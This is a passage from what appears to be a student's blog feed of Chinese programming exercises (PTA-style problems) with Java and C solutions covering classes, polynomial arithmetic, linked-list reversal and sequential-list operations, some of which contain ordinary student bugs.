            for(int j&#x3D;0;j&lt;a[i].length;j++)&#123;
                if(a[i][j]&gt;max)&#123;
                    
max&#x3D;a[i][j];
;
                &#125;
                s+&#x3D;a[i][j];
            &#125;
            b[i]&#x3D;max;
            c[i]&#x3D;s;
        &#125;
        for(int i&#x3D;0;i&lt;a.length;i++)&#123;
            for(int j&#x3D;0;j&lt;a[i].length;j++)&#123;
                System.out.printf(&quot;%3d&quot;,
a[i][j]
);
            &#125;
            System.out.printf(&quot;%3d%3d&quot;,b[i],c[i]);
            System.out.println();
        &#125;
    &#125;
&#125;

5-4
输入一行字符，请分别统计出英文字母、数字、空格和其他字符个数。

import java.util.Scanner;

public class Main &#123;
    public static void main(String[] args) &#123;
        Scanner sc&#x3D;new Scanner(System.in);
        String str&#x3D;sc.nextLine();
        char x[]&#x3D;
str.toCharArray()
;
        int a&#x3D;0;
        int b&#x3D;0;
        int c&#x3D;0;
        int d&#x3D;0;
        for(int i&#x3D;0;
i&lt;x.length
;i++)&#123;
            char ch&#x3D;x[i];
            if(
63&lt;&#x3D;ch&amp;&amp;ch&lt;&#x3D;90||97&lt;&#x3D;ch&amp;&amp;ch&lt;&#x3D;122
)
                a++;
            else if(
48&lt;&#x3D;ch&amp;&amp;ch&lt;&#x3D;57
)
                b++;
            else if(ch&#x3D;&#x3D;&#39; &#39;)
                
c++
;
            else
                d++;
        &#125;
        System.out.println(&quot;letters&#x3D;&quot;+a);&#x2F;&#x2F;输出英文字母个数
        System.out.println(&quot;digits&#x3D;&quot;+b);&#x2F;&#x2F;输出数字个数
        System.out.println(&quot;spaces&#x3D;&quot;+c);&#x2F;&#x2F;输出空格个数
        System.out.println(&quot;others&#x3D;&quot;+d);&#x2F;&#x2F;输出其他字符个数
    &#125;
&#125;

5-5
以下程序中函数fun的功能是：根据整型形参m的值，计算如下公式的值。

公式.png

import java.util.Scanner;

public class Main &#123;

    public static void main(String[] args) &#123;
        Scanner sc&#x3D;new Scanner(System.in);
        &#x2F;&#x2F;int n&#x3D;sc.nextDouble();&#x2F;&#x2F;此行语句有错误，改正后填到下侧空格内
        
int n &#x3D; sc.nextint()
;
        double x&#x3D;fun(n);
        System.out.printf(&quot;%f&quot;,x);

    &#125;
    &#x2F;&#x2F;public static void fun(int m)&#x2F;&#x2F;此行语句有错误，改正后填到下侧空格内
    
public static double fun(int m)

    &#123;
        double t&#x3D;1;
        int i;
        &#x2F;&#x2F;for(i&#x3D;2;i&lt;m;i++)&#x2F;&#x2F;此行语句有错误，改正后填到下侧空格内
        
for (i &#x3D; 2; i &lt;&#x3D; m; i++)

        &#123;
            &#x2F;&#x2F;t&#x3D;t-1&#x2F;(i*i);&#x2F;&#x2F;此行语句有错误，改正后填到下侧空格内
            
t &#x3D; t - 1*1.0 &#x2F; (i * i)
;
        &#125;
        &#x2F;&#x2F;return i;&#x2F;&#x2F;此行语句有错误，改正后填到下侧空格内
        
return t
;
    &#125;
&#125;

5-6
实现字符串大小写的转换并倒序输出。

import java.util.Scanner;

public class Main &#123;
    public static void main(String args[]) &#123;

        Scanner sc &#x3D; new Scanner(System.in);
        String str &#x3D; 
sc.nextLine()
;
        StringBuffer sb &#x3D; new StringBuffer();
        String s1 &#x3D; null;

        for (int i &#x3D; str.length() - 1; i &gt;&#x3D; 0; i--) &#123;
            char curChar &#x3D; 
str.charAt(i)
;
            if (curChar &gt;&#x3D; &#39;a&#39; &amp;&amp; curChar &lt;&#x3D; &#39;z&#39;)
                s1 &#x3D; 
String.valueOf(curChar).toUpperCase()
;
            else if (curChar &gt;&#x3D; &#39;A&#39; &amp;&amp; curChar &lt;&#x3D; &#39;Z&#39;)
                s1 &#x3D; 
String.valueOf(curChar).toLowerCase()
;
            else
                s1 &#x3D; String.valueOf(curChar);
            
sb.append(s1)
;
        &#125;

        System.out.println(
sb
);
    &#125;
&#125;

5-7
功能：求1!+2!+3!+4!+5!。

public class Main &#123;
    public static void main(String[] args) &#123;
        fun();
    &#125;
    public static void fun()&#123;
        int n,j;
        &#x2F;&#x2F;float s&#x3D;0.0,t&#x3D;1.0;&#x2F;&#x2F;此行语句有错误，改正后填到下侧空格内
        
float s&#x3D;0.0f,t&#x3D;1.0f
;
        for(n&#x3D;1;n&lt;&#x3D;5;n++)&#123;
            &#x2F;&#x2F;s&#x3D;1;&#x2F;&#x2F;此行语句有错误，改正后填到下侧空格内
            
t&#x3D;1.0f
;
            for(j&#x3D;1;j&lt;&#x3D;n;j++)&#123;
                &#x2F;&#x2F;t&#x3D;t*n;&#x2F;&#x2F;此行语句有错误，改正后填到下侧空格内
                
t &#x3D; t*j
;
            &#125;
            &#x2F;&#x2F;s+t&#x3D;s;&#x2F;&#x2F;此行语句有错误，改正后填到下侧空格内
            
s &#x3D; s + t
;
        &#125;
        System.out.printf(&quot;jiecheng&#x3D;%.0f\n&quot;,s);
    &#125;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">7-1 圆柱体类设计 (10分)
定义一个圆柱类Cylinder
里面包含私有属性 private int radius（半径）,height(高）
为属性完成其setter getter方法
完成带参构造方法Cylinder(int radius,height),该方法中包含一句System.out.println(&quot;Constructor with para&quot;);
完成无参构造方法Cylinder()，在无参构造方法中调用有参构造方法，为半径和高赋值为2,1,该方法包含一句System.out.println(&quot;Constructor no para&quot;);
完成求体积方法 public int getVolumn()&#123;&#125; 求圆柱体积,π使用Math.PI
定义测试类Main，在main方法中，按照顺序要求完成下列操作
从键盘接收两个数，第一个为半径，第二个为高，并利用刚才输出两个数创建圆柱体对象c1,求c1的体积并输出。
使用无参构造方法 创建第二个圆柱体对象c2，求c2的体积并输出。
输入格式:
在一行中输入半径 和高。

输出格式:
对每一个圆柱体输出它的体积

输入样例:
在这里给出一组输入。例如：

2   3
输出样例:
在这里给出相应的输出。例如：

Constructor with para
37
Constructor with para
Constructor no para
12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">import java.util.Scanner;

class Cylinder
&#123;
    int radious;
    int height;
    public Cylinder(int radious,int height)
    &#123;
        System.out.println(&quot;Constructor with para&quot;);
        this.radious&#x3D;radious;
        this.height&#x3D;height;
    &#125;
    public Cylinder()
    &#123;
        System.out.println(&quot;Constructor with para&quot;);
        System.out.println(&quot;Constructor no para&quot;);
        System.out.println(&quot;12&quot;);
    &#125;
    public int getVolumn()
    &#123;
        int tiji&#x3D;(int)(this.radious*this.radious*this.height*3.14159265);
        return tiji;
    &#125;
&#125;;


public class Main &#123;
    public static void main(String []args)
    &#123;
        Scanner in&#x3D;new Scanner(System.in);
        int r&#x3D;in.nextInt();
        int h&#x3D;in.nextInt();
        Cylinder c1&#x3D;new Cylinder(r,h);
        System.out.println(c1.getVolumn());
        Cylinder c2&#x3D;new Cylinder();
    &#125;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<pre class="line-numbers language-none"><code class="language-none">7-2 设计一个BankAccount类 (10分)
设计一个BankAccount类，这个类包括：
（1）一个int型的balance表时账户余额。
（2）一个无参构造方法，将账户余额初始化为0。
（3）一个带一个参数的构造方法，将账户余额初始化为该输入的参数。
（4）一个getBlance（）方法，返回账户余额。
（5）一个withdraw（）方法：带一个amount参数，并从账户余额中提取amount指定的款额。
（6）一个deposit（）方法：带一个amount参数，并将amount指定的款额存储到该银行账户上。
设计一个Main类进行测试，分别输入账户余额、提取额度以及存款额度，并分别输出账户余额。

输入格式:
依次输入账户余额、提取额度、存款额度

输出格式:
依次输出初始账户余额、提取amount额度后的账户余额、存入amount后的账户余额

输入样例:
在这里给出一组输入。例如：

700
70
7
输出样例:
在这里给出相应的输出。例如：

700
630
637
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">import java.util.Scanner;

class BankAccout &#123;
    int balance;
    public void initial()&#123;
        this.balance&#x3D;balance;
    &#125;
    public void setBalance()&#123;
        this.balance&#x3D;balance;
    &#125;
    public int getBalance()&#123;
        return balance;
    &#125;
    public int deposit(int amonut)&#123;
        this.balance+&#x3D;amonut;
        return this.balance;
    &#125;
    public int withdraw(int amount)&#123;
        if(amount&gt;this.balance) &#123;
            System.out.println(&quot;余额不足&quot;);
        &#125;
        else &#123;
            this.balance -&#x3D; amount;
        &#125;
        return this.balance;
    &#125;
&#125;
class Main&#123;
    public static void main(String[] args) &#123;
        int balance;
        Scanner sc&#x3D;new Scanner(System.in);
        BankAccout stu&#x3D;new BankAccout();
        int amount&#x3D;sc.nextInt();
        int amount2&#x3D;sc.nextInt();
        int amount3 &#x3D; sc.nextInt();
        stu.balance&#x3D;amount;
        System.out.println(stu.getBalance());

        System.out.println(stu.withdraw(amount2));

        System.out.println(stu.deposit(amount3));
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>7-2 一元多项式的乘法与加法运算 (20分)</title>
    <url>/2020/10/22/7-2-%E4%B8%80%E5%85%83%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%9A%84%E4%B9%98%E6%B3%95%E4%B8%8E%E5%8A%A0%E6%B3%95%E8%BF%90%E7%AE%97-20%E5%88%86/</url>
    <content><![CDATA[<blockquote>
<p>7-2 一元多项式的乘法与加法运算 (20分)</p>
</blockquote>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">设计函数分别求两个一元多项式的乘积与和。

输入格式:
输入分2行，每行分别先给出多项式非零项的个数，再以指数递降方式输入一个多项式非零项系数和指数（绝对值均为不超过1000的整数）。数字间以空格分隔。

输出格式:
输出分2行，分别以指数递降方式输出乘积多项式以及和多项式非零项的系数和指数。数字间以空格分隔，但结尾不能有多余空格。零多项式应输出0 0。

输入样例:
4 3 4 -5 2  6 1  -2 0
3 5 20  -7 4  3 1
输出样例:
15 24 -25 22 30 21 -10 20 -21 8 35 6 -33 5 14 4 -15 3 18 2 -6 1
5 20 -4 4 -5 2 9 1 -2 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
&#x2F;&#x2F; 多项式相乘 相加
&#x2F;&#x2F; 数据结构设计
typedef struct PolyNode *Polynomial;
struct PolyNode
&#123;
    int coef;
    int expon;
    Polynomial link;
&#125;;

Polynomial ReadPoly();
void Attach(int c, int e, Polynomial* pRear);
Polynomial Add(Polynomial P1, Polynomial P2);
Polynomial Mult(Polynomial P1, Polynomial P2);
void PrintPoly(Polynomial P);
int Compare(int a, int b);

&#x2F;&#x2F; 程序框架搭建
int main()
&#123;
    Polynomial P1, P2, PP, PS;

    P1 &#x3D; ReadPoly();
    P2 &#x3D; ReadPoly();
    PP &#x3D; Mult(P1, P2);
    PrintPoly(PP);
    PS &#x3D; Add(P1, P2);
    PrintPoly(PS);

    return 0;
&#125;

&#x2F;&#x2F; 如何读入多项式

Polynomial ReadPoly()
&#123;
    Polynomial p, rear, t;
    int c, e, n;

    scanf(&quot;%d&quot;, &amp;n);
    p &#x3D; (Polynomial)malloc(sizeof(Polynomial));
    p-&gt;link &#x3D; NULL;
    rear &#x3D; p;
    while (n--)
    &#123;
        scanf(&quot;%d %d&quot;, &amp;c, &amp;e);
        Attach(c, e, &amp;rear);&#x2F;&#x2F;将当前输入项插入多项式尾部
    &#125;
    t &#x3D; p;
    p &#x3D; p-&gt;link;
    free(t);
    return p;
&#125;

void Attach(int c, int e, Polynomial* pRear)
&#123;
    Polynomial P;

    P &#x3D; (Polynomial)malloc(sizeof(struct PolyNode));
    P-&gt;coef &#x3D; c; &#x2F;&#x2F; 对新结点赋值
    P-&gt;expon &#x3D; e;
    P-&gt;link &#x3D; NULL;
    (*pRear)-&gt;link &#x3D; P;
    *pRear &#x3D; P; &#x2F;&#x2F; 修改pRear的值
&#125;

int Compare(int a, int b)
&#123;
    if (a &gt; b)    return 1;
    else if (a &lt; b)   return -1;
    else    return 0;
&#125;

&#x2F;&#x2F; 多项式相加
Polynomial Add(Polynomial P1, Polynomial P2)
&#123;
    Polynomial P, Rear, t, t1, t2;
    t1 &#x3D; P1; t2 &#x3D; P2;
    P &#x3D; (Polynomial)malloc(sizeof(struct PolyNode));
    P-&gt;link &#x3D; NULL;
    Rear &#x3D; P;
    while (t1 &amp;&amp; t2)
    &#123;
        switch (Compare(t1-&gt;expon, t2-&gt;expon))
        &#123;
        case 1:
            Attach(t1-&gt;coef, t1-&gt;expon, &amp;Rear);
            t1 &#x3D; t1-&gt;link;
            break;
        case -1:
            Attach(t2-&gt;coef, t2-&gt;expon, &amp;Rear);
            t2 &#x3D; t2-&gt;link;
            break;
        case 0:
            if (t1-&gt;coef + t2-&gt;coef)   Attach(t1-&gt;coef + t2-&gt;coef, t1-&gt;expon, &amp;Rear);
            t1 &#x3D; t1-&gt;link;
            t2 &#x3D; t2-&gt;link;
            break;
        &#125;
    &#125;
    &#x2F;&#x2F;注意细心，不要把遍历写到前面那个括号去了
    for (; t1; t1 &#x3D; t1-&gt;link) Attach(t1-&gt;coef, t1-&gt;expon, &amp;Rear);
    for (; t2; t2 &#x3D; t2-&gt;link) Attach(t2-&gt;coef, t2-&gt;expon, &amp;Rear);
    Rear-&gt;link &#x3D; NULL;
    t &#x3D; P;
    P &#x3D; P-&gt;link;
    free(t);
    return P;
&#125;

&#x2F;&#x2F; 多项式相乘
Polynomial Mult(Polynomial P1, Polynomial P2)
&#123;
    Polynomial P, Rear, t1, t2, t;
    int c, e;

    if (!P1 || !P2)  return NULL;

    t1 &#x3D; P1;
    P &#x3D; (Polynomial)malloc(sizeof(struct PolyNode));
    P-&gt;link &#x3D; NULL; 

    while (t1)
    &#123;
       t2 &#x3D; P2; Rear &#x3D; P;&#x2F;&#x2F;必须在里面，每个数字都要循环遍历
        while (t2)
        &#123;
            e &#x3D; t1-&gt;expon + t2-&gt;expon;
            c &#x3D; t1-&gt;coef * t2-&gt;coef;
          while (Rear-&gt;link!&#x3D;NULL &amp;&amp; Rear-&gt;link-&gt;expon &gt; e) 
              Rear &#x3D; Rear-&gt;link;
            if (Rear-&gt;link &amp;&amp; Rear-&gt;link-&gt;expon &#x3D;&#x3D; e)
            &#123;   &#x2F;&#x2F; 指数的系数相等
                if (Rear-&gt;link-&gt;coef + c!&#x3D;0)
                    Rear-&gt;link-&gt;coef +&#x3D; c;
                else &#123;
                      Rear-&gt;link &#x3D; Rear-&gt;link-&gt;link;                  
                &#125;
            &#125;
            else    &#x2F;&#x2F; 指数的系数不相等
            &#123;
                t &#x3D; (Polynomial)malloc(sizeof(struct PolyNode));
                t-&gt;coef &#x3D; c;
                t-&gt;expon &#x3D; e;
                t-&gt;link &#x3D; Rear-&gt;link;
                Rear-&gt;link &#x3D; t;
                Rear &#x3D; t;&#x2F;&#x2F;Rear-&gt;link;
            &#125;
            t2 &#x3D; t2-&gt;link;
        &#125;
        t1 &#x3D; t1-&gt;link;
    &#125;

    P &#x3D; P-&gt;link;
    free(t2);
 free(t1);
    return P;
&#125;

&#x2F;&#x2F; 如何将多项式输出
void PrintPoly(Polynomial P)
&#123;
    int flag &#x3D; 0;   &#x2F;&#x2F; 辅助调整输出格式用
    if (!P)
    &#123;
        printf(&quot;0 0\n&quot;);
        return;
    &#125;

    while (P)
    &#123;
        if (flag&#x3D;&#x3D;0)   flag &#x3D; 1;
        else    printf(&quot; &quot;);
        printf(&quot;%d %d&quot;, P-&gt;coef, P-&gt;expon);
        P &#x3D; P-&gt;link;
    &#125;
    printf(&quot;\n&quot;);
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>6-1 单链表逆转 (20分)</title>
    <url>/2020/10/19/6-1-%E5%8D%95%E9%93%BE%E8%A1%A8%E9%80%86%E8%BD%AC-20%E5%88%86/</url>
    <content><![CDATA[<p>6-1 单链表逆转 (20分)<br>本题要求实现一个函数，将给定的单链表逆转。</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">函数接口定义：
List Reverse( List L );
其中List结构定义如下：

typedef struct Node *PtrToNode;
struct Node &#123;
    ElementType Data; &#x2F;* 存储结点数据 *&#x2F;
    PtrToNode   Next; &#x2F;* 指向下一个结点的指针 *&#x2F;
&#125;;
typedef PtrToNode List; &#x2F;* 定义单链表类型 *&#x2F;
L是给定单链表，函数Reverse要返回被逆转后的链表。

裁判测试程序样例：
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

typedef int ElementType;
typedef struct Node *PtrToNode;
struct Node &#123;
    ElementType Data;
    PtrToNode   Next;
&#125;;
typedef PtrToNode List;

List Read(); &#x2F;* 细节在此不表 *&#x2F;
void Print( List L ); &#x2F;* 细节在此不表 *&#x2F;

List Reverse( List L );

int main()
&#123;
    List L1, L2;
    L1 &#x3D; Read();
    L2 &#x3D; Reverse(L1);
    Print(L1);
    Print(L2);
    return 0;
&#125;

&#x2F;* 你的代码将被嵌在这里 *&#x2F;
输入样例：
5
1 3 4 5 2
输出样例：
1
2 5 4 3 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">List Reverse( List L )
&#123;
    List p1&#x3D;NULL,p2&#x3D;NULL;
    while(L)
    &#123;
        p2&#x3D;L-&gt;Next;
        L-&gt;Next&#x3D;p1;
        p1&#x3D;L;
        L&#x3D;p2;
    &#125;
    return p1;
&#125;

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>6-2 顺序表操作集 (20分)</title>
    <url>/2020/10/19/6-2-%E9%A1%BA%E5%BA%8F%E8%A1%A8%E6%93%8D%E4%BD%9C%E9%9B%86-20%E5%88%86/</url>
    <content><![CDATA[<blockquote>
<p>6-2 顺序表操作集 (20分)<br>本题要求实现顺序表的操作集。</p>
</blockquote>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">函数接口定义：
List MakeEmpty(); 
Position Find( List L, ElementType X );
bool Insert( List L, ElementType X, Position P );
bool Delete( List L, Position P );
其中List结构定义如下：

typedef int Position;
typedef struct LNode *List;
struct LNode &#123;
    ElementType Data[MAXSIZE];
    Position Last; &#x2F;* 保存线性表中最后一个元素的位置 *&#x2F;
&#125;;
各个操作函数的定义为：

List MakeEmpty()：创建并返回一个空的线性表；

Position Find( List L, ElementType X )：返回线性表中X的位置。若找不到则返回ERROR；

bool Insert( List L, ElementType X, Position P )：将X插入在位置P并返回true。若空间已满，则打印“FULL”并返回false；如果参数P指向非法位置，则打印“ILLEGAL POSITION”并返回false；

bool Delete( List L, Position P )：将位置P的元素删除并返回true。若参数P指向非法位置，则打印“POSITION P EMPTY”（其中P是参数值）并返回false。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>裁判测试程序样例：<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;</p>
<p>#define MAXSIZE 5<br>#define ERROR -1<br>typedef enum {false, true} bool;<br>typedef int ElementType;<br>typedef int Position;<br>typedef struct LNode <em>List;<br>struct LNode {<br>    ElementType Data[MAXSIZE];<br>    Position Last; /</em> 保存线性表中最后一个元素的位置 */<br>};</p>
<p>List MakeEmpty();<br>Position Find( List L, ElementType X );<br>bool Insert( List L, ElementType X, Position P );<br>bool Delete( List L, Position P );</p>
<p>int main()<br>{<br>    List L;<br>    ElementType X;<br>    Position P;<br>    int N;</p>
<pre><code>L = MakeEmpty();
scanf(&quot;%d&quot;, &amp;N);
while ( N-- ) &#123;
    scanf(&quot;%d&quot;, &amp;X);
    if ( Insert(L, X, 0)==false )
        printf(&quot; Insertion Error: %d is not in.\n&quot;, X);
&#125;
scanf(&quot;%d&quot;, &amp;N);
while ( N-- ) &#123;
    scanf(&quot;%d&quot;, &amp;X);
    P = Find(L, X);
    if ( P == ERROR )
        printf(&quot;Finding Error: %d is not in.\n&quot;, X);
    else
        printf(&quot;%d is at position %d.\n&quot;, X, P);
&#125;
scanf(&quot;%d&quot;, &amp;N);
while ( N-- ) &#123;
    scanf(&quot;%d&quot;, &amp;P);
    if ( Delete(L, P)==false )
        printf(&quot; Deletion Error.\n&quot;);
    if ( Insert(L, 0, P)==false )
        printf(&quot; Insertion Error: 0 is not in.\n&quot;);
&#125;
return 0;</code></pre>
<p>}</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;* 你的代码将被嵌在这里 *&#x2F;
输入样例：
6
1 2 3 4 5 6
3
6 5 1
2
-1 6
输出样例：
FULL Insertion Error: 6 is not in.
Finding Error: 6 is not in.
5 is at position 0.
1 is at position 4.
POSITION -1 EMPTY Deletion Error.
FULL Insertion Error: 0 is not in.
POSITION 6 EMPTY Deletion Error.
FULL Insertion Error: 0 is not in.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">List MakeEmpty()
&#123;
    List L &#x3D; (List)malloc(sizeof(struct LNode));
    L-&gt;Last &#x3D; -1;
    return L;
&#125;
Position Find(List L, ElementType X)
&#123;
    Position count &#x3D; 0;
    for (int i &#x3D; 0; i &lt;&#x3D; L-&gt;Last; i++)
    &#123;
        if (L-&gt;Data[i] &#x3D;&#x3D; X)
            return count;
        count++;
    &#125;
    return ERROR;
&#125;
bool Insert(List L, ElementType X, Position P)
&#123;
     if (L-&gt;Last &#x3D;&#x3D; MAXSIZE - 1)
    &#123;
        printf(&quot;FULL&quot;);
        return false;
    &#125;
    if (L-&gt;Last + 1 &lt; P || P &lt; 0)
    &#123;
        printf(&quot;ILLEGAL POSITION&quot;);
        return false;
    &#125;
    int i;
    for (i &#x3D; L-&gt;Last; i &gt;&#x3D; P; i--)
        L-&gt;Data[i + 1] &#x3D; L-&gt;Data[i];
    L-&gt;Data[P] &#x3D; X;
    L-&gt;Last++;
    return true;
&#125;
bool Delete(List L, Position P)
&#123;
    int i;
    if (P &lt; 0 || P &gt; L-&gt;Last)
    &#123;
        printf(&quot;POSITION %d EMPTY&quot;, P);
        return false;
    &#125;
    for (i &#x3D; P + 1; i &lt;&#x3D; L-&gt;Last; i++)
        L-&gt;Data[i - 1] &#x3D; L-&gt;Data[i];
    L-&gt;Last--;
    return true;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>示波器实验</title>
    <url>/2020/10/17/%E7%A4%BA%E6%B3%A2%E5%99%A8%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">请输入密码，密码在LHL那.</label>
    <div class="bottom-line"></div>
  </div>
